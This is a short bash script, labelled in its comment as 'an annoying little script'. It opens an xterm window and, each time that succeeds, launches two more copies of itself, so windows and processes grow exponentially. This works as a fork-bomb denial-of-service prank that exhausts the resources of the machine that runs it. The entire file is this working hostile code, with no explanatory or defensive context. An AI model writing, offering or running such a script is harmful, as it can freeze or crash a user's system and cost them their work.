#!/bin/bash

# This is an annoying little script

xterm

if [ $? -eq 0 ]; then
 $0 & $0;
fi

